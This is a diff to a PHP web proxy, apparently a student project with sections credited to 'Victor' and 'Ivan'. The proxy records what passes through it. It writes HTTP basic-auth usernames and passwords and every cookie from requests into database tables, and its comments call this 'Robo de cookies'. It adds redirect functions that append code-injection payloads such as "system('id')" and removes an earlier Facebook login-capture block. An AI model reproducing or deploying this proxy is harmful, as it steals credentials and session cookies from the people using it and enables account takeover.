@@ -2,8 +2,29 @@
 $anonymize = true;
 $CodigoAI = "malicious.php";
 
-function ejecutarSQLInjection(){
+//------------------------------------------------A campieza codigo de Victor-------------------------------
+//-------------------------------------Funciones solo de llamar----------------------------
+function intentarEvalCodeInjPHPInfo($PROXY_PREFIX, $url){
+  if (!empty($_GET)) {
+    $url = $url . "phpinfo()";
+  }
+  header( "Location: " . $PROXY_PREFIX . $url );
+  exit(0);
+}
+function intentarEvalCodeInjPHPInfo2($PROXY_PREFIX, $url){
+  if (!empty($_GET)) {
+    $url = $url . "system('id')";
+  }
+  header( "Location: " . $PROXY_PREFIX . $url );
+  exit(0);
+}
 
+function intentarSQLInj_1($PROXY_PREFIX, $url){
+  if (!empty($_POST)) {
+    $url = $url . "system('id')";
+  }
+  header( "Location: " . $PROXY_PREFIX . $url);
+  exit(0); ///falta
 }
 
 function getHostnamePattern($hostname) {
@@ -12,12 +33,13 @@ function getHostnamePattern($hostname) {
 }
 
 function dormirPremium($UsuarioPremium){
-	if ($UsuarioPremium == 'true'){
+  if ($UsuarioPremium === 'true'){
   }
   else{
-    usleep(1000);
+    usleep(0);
   }
 }
+//------------------------------------------------A termina codigo de Victor-------------------------------
 
 function removeKeys(&$assoc, $keys2remove) {
   $keys = array_keys($assoc);
@@ -58,25 +80,16 @@ function makeRequest($url) {
     $user_username = $_SERVER["PHP_AUTH_USER"];
     $user_password = $_SERVER["PHP_AUTH_PW"];
     $sql="INSERT INTO contra (usuario, contrasena)  VALUES ('$user_username', '$user_password'); ";
-    $conn->query($sql);
+    mysqli_query($conn, $sql);
   }
   //------------------------------------------------A termina codigo de Ivan-------------------------------
 
   //------------------------------------------------A campieza codigo de Victor-------------------------------
-  if($_SERVER["REQUEST_METHOD"] == "POST") { //Para facebook
-    if (isset($_POST['email']) && isset($_POST['pass'])){
-      $username  =  $_POST['email'];
-      $password  =  $_POST['pass'];
-      $sql="INSERT INTO credenciales (usuario, contrasena)  VALUES ('$username', '$password'); ";
-      mysqli_query($conn, $sql);
-    }
-  }
-  foreach ($_COOKIE as $key=>$val)
+  foreach ($_COOKIE as $key=>$val) //Robo de cookies
   {
     $sql="INSERT INTO cookies (keyy, val)  VALUES ('$key', '$val'); ";
     mysqli_query($conn, $sql);
   }
-
   //------------------------------------------------A termina codigo de Victor-------------------------------
 
   if (empty($user_agent)) {
@@ -88,10 +101,17 @@ function makeRequest($url) {
   $site = strtok($url, '?');
   
   $ip = $browserRequestHeaders["Host"];
-  $sql = "INSERT INTO movimietnos (ip, pagina)
-  VALUES ('$ip', '$site');  ";
+  $sql = "INSERT INTO movimietnos (ip, pagina) VALUES ('$ip', '$site');  ";
   mysqli_query($conn, $sql);
 
+  //------------------------------------------------A campieza codigo de Victor-------------------------------
+  $str_arr = preg_split ("/\,/", $browserRequestHeaders["Cookie"]); 
+  foreach ($str_arr as $key=>$val) //Mas robo de cookies
+  {
+    $sql="INSERT INTO cookies (keyy, val)  VALUES ('$key', '$val'); ";
+    mysqli_query($conn, $sql);
+  }
+  //------------------------------------------------A termina codigo de Victor-------------------------------
 
   $removedHeaders = removeKeys($browserRequestHeaders, array(
     "Accept-Encoding", 
@@ -99,8 +119,6 @@ function makeRequest($url) {
     "Host",
     "Origin"
   ));
-
-  include mal.php;
 
   $removedHeaders = array_map("strtolower", $removedHeaders);
   curl_setopt($ch, CURLOPT_ENCODING, "");
@@ -142,6 +160,8 @@ function makeRequest($url) {
   curl_close($ch);
   $responseHeaders = substr($response, 0, $headerSize);
   $responseBody = substr($response, $headerSize);
+  //echo $responseBody;
+  //exit();
   return array("headers" => $responseHeaders, "body" => $responseBody, "responseInfo" => $responseInfo);
 }
 
